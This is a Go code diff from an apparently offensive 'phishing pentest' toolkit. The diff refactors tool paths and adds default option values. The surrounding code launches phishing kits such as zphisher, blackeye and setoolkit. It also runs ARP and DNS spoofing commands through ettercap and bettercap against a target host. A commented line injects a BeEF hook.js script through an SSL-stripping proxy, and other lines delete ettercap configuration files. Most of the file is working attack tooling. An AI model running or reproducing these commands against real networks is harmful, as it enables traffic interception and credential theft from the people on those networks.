@@ -13,19 +13,35 @@ import(
 )
 
 var(
-    userName    string
-    userPass    string
-    userIface   string
+
     userInput   string
     userRhost   string
-    userLhost   string
-    userLPort   string
     userProxy   string
     userModule  string
-    userFakeDns string
+
+    userName = "beef"
+    userPass = "Jesus"
+    userIface = "eth0"
+    userLPort = "9999"
+    userFakeDns = "Jesus is coming soon"
+
+    userLhost = userLhostIp
     scanner = bufio.NewScanner(os.Stdin)
+    userLhostIp, _ = utils.GetDefaultIP()
+    userCertDir, userOutPutDir, userToolsDir, userWordList = utils.DirLocations()
 )
 
+var defaultValues = map[string]string{
+    "rhost": "",
+    "module": "",
+    "name": "beef",
+    "iface": "eth0",
+    "lport": "9999",
+    "password": "Jesus",
+    "fakedns": "Jesus is coming soon",
+    "lhost": userLhostIp,
+    "output": userOutPutDir,
+}
 
 func PhishingPentest() {
     for {
@@ -181,8 +197,16 @@ func handleSetCommand(parts []string) {
     }
     key, value := parts[1], parts[2]
     setValues := map[string]*string{
+        "name": &userName,
+        "iface": &userIface,
+        "rhost": &userRhost,
+        "lport": &userLPort,
         "proxy": &userProxy,
+        "lhost": &userLhostIp,
         "module": &userModule,
+        "password": &userPass,
+        "fakedns": &userFakeDns,
+        "output": &userOutPutDir,
     }
     if ptr, exists := setValues[key]; exists {
         *ptr = value
@@ -199,12 +223,20 @@ func handleUnsetCommand(parts []string) {
     }
     key := parts[1]
     unsetValues := map[string]*string{
+        "name": &userName,
+        "iface": &userIface,
+        "rhost": &userRhost,
+        "lport": &userLPort,
         "proxy": &userProxy,
+        "lhost": &userLhostIp,
         "module": &userModule,
+        "password": &userPass,
+        "fakedns": &userFakeDns,
+        "output": &userOutPutDir,
     }
     if ptr, exists := unsetValues[key]; exists {
-        *ptr = ""
-        fmt.Printf("%s => None\n", strings.ToUpper(key))
+        *ptr = defaultValues[key] // Reset to default
+        fmt.Printf("%s => %s\n", strings.ToUpper(key), *ptr)
     } else {
         menus.HelpInfoSet()
     }
@@ -221,7 +253,7 @@ func executeModule() {
 
 
 func PhishingPenModules(module string, args ...interface{}) {
-    fmt.Printf("\nMODULE => %s\n", userRhost, module)
+    fmt.Printf("\nMODULE => %s\n", module)
     if userProxy != "" {
         fmt.Printf("PROXIES => %s\n", userProxy)
         utils.SetProxy(userProxy)
@@ -258,41 +290,41 @@ func GoodGinx() {
 }
 
 func Thc() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/thc/; bash thc.sh`)
+    subprocess.Popen(`cd %s/phishers/thc/; bash thc.sh`, userToolsDir)
 }
 
 func SetoolKit() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/set/; python3 setoolkit`)
+    subprocess.Popen(`cd %s/phishers/set/; python3 setoolkit`, userToolsDir)
 }
 
 func ZPhisher() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/zphisher/; bash zphisher.sh`)
+    subprocess.Popen(`cd %s/phishers/zphisher/; bash zphisher.sh`, userToolsDir)
 }
 
 func Blackeye() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/blackeye/; bash blackeye.sh`)
+    subprocess.Popen(`cd %s/phishers/blackeye/; bash blackeye.sh`, userToolsDir)
 }
 
 func ShellPhish() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/shellphish/; bash shellphish.sh`)
+    subprocess.Popen(`cd %s/phishers/shellphish/; bash shellphish.sh`, userToolsDir)
 }
 
 func Darkphish() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/darkphish/; python3 dark-phish.py`)
+    subprocess.Popen(`cd %s/phishers/darkphish/; python3 dark-phish.py`, userToolsDir)
 }
 
 func AdvPhisher() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/advphishing/; bash advphishing.sh`)
+    subprocess.Popen(`cd %s/phishers/advphishing/; bash advphishing.sh`, userToolsDir)
 }
 
 func CyberPhish() {
-    subprocess.Popen(`cd /root/.afr3/africana-base/phishers/cyberphish/; python3 cyberphish.py`)
+    subprocess.Popen(`cd %s/phishers/cyberphish/; python3 cyberphish.py`, userToolsDir)
 }
 
 func NinjaEttercap(userRhost string) {
     userLhostIp, err := utils.GetDefaultIP()
     if err != nil {
-        fmt.Println("Error getting default userLhostIp:", err)
+        fmt.Printf("Error getting default userLhostIp:", err)
         os.Exit(1)
     }
     menus.MenuSevenOne()
@@ -359,7 +391,7 @@ func NinjaEttercap(userRhost string) {
         }
         fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof /%s// /%s//" &`, userIface, userRhost, userGateway)
-        subprocess.Popen(`cd /root/.afr3/africana-base/phishers/blackeye; bash blackeye.sh`)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
         fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     case "2":
@@ -414,7 +446,7 @@ func NinjaEttercap(userRhost string) {
         }
         fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "ettercap -TQi %s -M arp:remote -P dns_spoof ///" &`, userIface)
-        subprocess.Popen(`cd /root/.afr3/africana-base/phishers/blackeye; bash blackeye.sh`)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
         fmt.Println()
         subprocess.Popen(`rm -rf /etc/ettercap/etter.conf; rm -rf /etc/ettercap/etter.dns; mv /etc/ettercap/etter.conf.bak_africana /etc/ettercap/etter.conf; mv /etc/ettercap/etter.dns.bak_africana /etc/ettercap/etter.dns`)
     default:
@@ -426,7 +458,7 @@ func NinjaEttercap(userRhost string) {
 func NinjaBettercap(userRhost string) {
     userLhostIp, err := utils.GetDefaultIP()
     if err != nil {
-        fmt.Println("Error getting default userLhostIp:", err)
+        fmt.Printf("Error getting default userLhostIp:", err)
         os.Exit(1)
     }
     menus.MenuSevenOne()
@@ -457,7 +489,7 @@ func NinjaBettercap(userRhost string) {
         //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.afr3/certs/africana-cert.pem; set https.proxy.key /root/.afr3/certs/africana-key.pem; set arp.spoof.targets %s; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userRhost, userLhost)
         fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set dns.spoof.domains *.*; set net.sniff.verbose true; arp.spoof on; dns.spoof on; active'"&`, userIface, userRhost)
-        subprocess.Popen(`cd /root/.afr3/africana-base/phishers/blackeye; bash blackeye.sh`)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
     case "2":
         fmt.Println()
         subprocess.Popen(`ip address`)
@@ -478,7 +510,7 @@ func NinjaBettercap(userRhost string) {
         //fmt.Println(); subprocess.Popen(`systemctl restart beef-xss.service; systemctl --no-pager status beef-xss; sleep 5; xdg-open "http://%s:3000/ui/panel" 2>/dev/null; bettercap --iface %s -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set http.proxy.injectjs http://%s:3000/hook.js; set https.proxy.injectjs http://%s:3000/hook.js; set https.proxy.certificate /root/.afr3/certs/africana-cert.pem; set https.proxy.key /root/.afr3/certs/africana-key.pem; set http.proxy.sslstrip true; set https.proxy.sslstrip true; http.proxy on; https.proxy on; arp.spoof on; set net.sniff.verbose true; active"`, userLhost, userIface, userLhost, userLhost)
         fmt.Println()
         subprocess.Popen(`xterm -geometry 128x33 -T 'Glory be To Lord God Jesus Christ' -e "bettercap --iface %s -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set dns.spoof.domains *.*; set net.sniff.verbose true; set dns.spoof.all true; arp.spoof on; dns.spoof on; active'"&`, userIface)
-        subprocess.Popen(`cd /root/.afr3/africana-base/phishers/blackeye; bash blackeye.sh`)
+        subprocess.Popen(`cd %s/phishers/blackeye; bash blackeye.sh`, userToolsDir)
     default:
         utils.SystemShell(userInput)
     }
